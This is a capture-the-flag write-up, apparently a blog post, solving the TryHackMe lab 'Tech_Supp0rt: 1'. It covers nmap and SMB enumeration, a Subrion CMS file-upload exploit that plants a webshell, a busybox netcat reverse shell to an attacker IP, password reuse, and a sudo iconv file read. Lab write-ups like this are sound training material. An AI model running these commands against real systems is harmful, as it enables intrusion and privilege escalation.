---
title: "Tech_Supp0rt: 1"
date: 2025-01-29
image: /assets/img/tryhackme/Techsupport/Techsupport_image.jpg
description: Writeup of the TryHackMe-CTF Tech_Supp0rt 1
categories: [TryHackMe, Easy]
tags: [linux, web, enumeration, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Tech_Supp0rt: 1</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Hack into the scammer's under-development website to foil their plans.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/techsupp0rt1">https://tryhackme.com/r/room/techsupp0rt1</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Tech_Supp0rt: 1.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.12.52         
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 04:57 EST
  Nmap scan report for 10.10.12.52
  Host is up (0.042s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds

  Nmap done: 1 IP address (1 host up) scanned in 24.59 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,139,445 10.10.12.52
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 04:57 EST
  Nmap scan report for 10.10.12.52
  Host is up (0.039s latency).

  PORT    STATE SERVICE     VERSION
  22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
  |   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
  |_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
  80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
  Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  | smb2-time: 
  |   date: 2025-01-29T09:57:33
  |_  start_date: N/A
  |_clock-skew: mean: -1h50m35s, deviation: 3h10m31s, median: -36s
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  |   Computer name: techsupport
  |   NetBIOS computer name: TECHSUPPORT\x00
  |   Domain name: \x00
  |   FQDN: techsupport
  |_  System time: 2025-01-29T15:27:32+05:30
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 17.31 seconds
```
From here I proceeded the analysis port by port.

## Port 445 Analysis
I analyzed the `smb` service using `enum4linux`:
```bash
$ enum4linux -a 10.10.12.52
  [... reduced for readability ...]

  ==================================( Share Enumeration on 10.10.12.52 )==================================


          Sharename       Type      Comment
          ---------       ----      -------
          print$          Disk      Printer Drivers
          websvr          Disk      
          IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing.

          Server               Comment
          ---------            -------

          Workgroup            Master
          ---------            -------
          WORKGROUP            

  [+] Attempting to map shares on 10.10.12.52                                                                                                                   

  //10.10.12.52/print$    Mapping: DENIED Listing: N/A Writing: N/A                                                                                             
  //10.10.12.52/websvr    Mapping: OK Listing: OK Writing: N/A

  [... reduced for readability ...]
```
It seems that the share called `websvr` not need authentication. Let's check using `smbclient`:
```bash
$ smbclient -N \\\\10.10.12.52\\websvr
  smb: \> dir
    .                                   D        0  Sat May 29 03:17:38 2021
    ..                                  D        0  Sat May 29 03:03:47 2021
    enter.txt                           N      273  Sat May 29 03:17:38 2021

                  8460484 blocks of size 1024. 5696600 blocks available
  smb: \> get enter.txt
  getting file \enter.txt of size 273 as enter.txt (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
```
The file `enter.txt` provides very intersting information:
```bash
$ cat enter.txt 
  GOALS
  =====
  1)Make fake popup and host it online on Digital Ocean server
  2)Fix subrion site, /subrion doesn't work, edit from panel
  3)Edit wordpress website

  IMP
  ===
  Subrion creds
  |->admin:[removed] [cooked with magical formula]
  Wordpress creds
  |->
```
From here the webserver seems to hosts a `Subrion CMS` and this could be some valid credentials. I used cyberchef to decrypt the string. The magic formula is `From Base58` > `From Base32` > `From Base64`. I moved on to the webserver to check for the mentioned `Subrion` instance.

## Port 80 Analysis
The webserver shows us a `Apache2` default page. Because I didn't found anything in the source code time for directory enumeration:
```bash
  $ gobuster dir --url http://10.10.12.52/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.12.52/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /wordpress            (Status: 301) [Size: 314] [--> http://10.10.12.52/wordpress/]
  /test                 (Status: 301) [Size: 309] [--> http://10.10.12.52/test/]
```

### /test Analysis
I started with the `/test` subdirectory. This looks like a nasty spam site:

![Scam Site](/assets/img/tryhackme/Techsupport/thm_techsupport_1.jpg)

### /wordpress Analysis
I proceed with a directory enumeration under the `wordpress` directory to find more intersting.
```bash
$ gobuster dir --url http://10.10.12.52/wordpress --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.12.52/wordpress
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 325] [--> http://10.10.12.52/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 326] [--> http://10.10.12.52/wordpress/wp-includes/]
/wp-admin             (Status: 301) [Size: 323] [--> http://10.10.12.52/wordpress/wp-admin/]
```

It seems to be only a wordpress instance so I analyzed it with `wpscan`. I tried several 
techniques but this was a rabbit hole.

### /subrion Analysis
There must be something with subrion, so let's search for the CMS. By simply combine what I found earlyier the website was found:
```html
http://10.10.12.52/subrion/panel/
```
I was able to login with the credentials:

![Subrion CMS Version](/assets/img/tryhackme/Techsupport/thm_techsupport_2.jpg)

The website reveals the CMS version on the right. A quick search gave me this <a href="https://www.exploit-db.com/exploits/49876">exploit-db</a> entry.

```bash
$ python3 exploit.py -u http://10.10.12.52/subrion/panel/ -l admin -p Scam2021 
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.12.52/subrion/panel/
[+] Success!
[+] Got CSRF token: iWSPOTIyhm592Vu8N65jCeb7QR5RuVJ0bKtnxuiE
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: kcpluiqkqieghuv

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.12.52/subrion/panel/uploads/kcpluiqkqieghuv.phar 

$ whoami
www-data
$ which busybox
	/bin/busybox

$ busybox nc [attacker ip] 9001 -e sh
```

## Privilege Escalation scamsite
Searched arround for a way to escalate to `scamsite` and found credentials in the `database.php` file from subrion:

```php
www-data@TechSupport:/var/www/html/subrion/admin$ cat database.php
  [... reduced for readability ...]
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', '[removed]' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

  [... reduced for readability ...]
```

Probably the user used this password several times:
```bash
www-data@TechSupport:/home$ su scamsite
Password: 
scamsite@TechSupport:/home$
```

Now I can use `ssh` for a more stable connection.

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
scamsite@TechSupport:~$ sudo -l
  Matching Defaults entries for scamsite on TechSupport:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User scamsite may run the following commands on TechSupport:
      (ALL) NOPASSWD: /usr/bin/iconv
```
A quick search in <a href="https://gtfobins.github.io/gtfobins/###/">gftobins</a> gave me all I needed:
```bash
scamsite@TechSupport:~$ LFILE=/root/root.txt
scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
[*** removed ***]  -
```

solved! :)
